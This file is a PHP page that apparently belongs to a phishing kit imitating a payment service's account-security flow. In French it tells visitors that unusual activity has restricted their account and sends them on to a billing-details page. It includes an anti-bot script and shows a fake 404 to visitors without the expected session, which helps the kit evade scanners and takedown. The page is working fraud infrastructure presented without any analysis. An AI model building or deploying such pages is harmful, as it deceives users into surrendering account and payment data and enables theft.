<?php 
ob_start();
session_start();
if(isset($_SESSION['step_one'])){
$_SESSION['step_two']  = true;
include'../antibots.php';
date_default_timezone_set('GMT');
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Sécurité</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain">
                <div class="contain-info">
                   <p class="hd"></p>
                   <div class="contain-lists">
                       <center>
                             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQeDj5WQfy94zw_6T-OPFoNNfN_syG6xDZxj1CD2HUDsBmJmF9z&s">
                            <h4>Nous avons remarqué une activité inhabituelle.</h4>
						      <h5>Confirmez vos informations pour protéger votre compte, celui ci restera restreint jusqu'à ce que vous ayez terminé les étapes nécessaires. 



<h5>La sécurité de votre compte est une priorité absolue pour l'utilisation de votre compte et nous voulons travailler ensemble pour aider à le protéger.</h5>

</h5>
						   
                       </center>
                       
                          
                       <center>
                           <a href="<?php echo 'billing.php?enc='.md5(time()).'&p=1&dispatch='.sha1(time()); ?>" class="proccess">Continuer</a>
                       </center>
                   
                </div>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>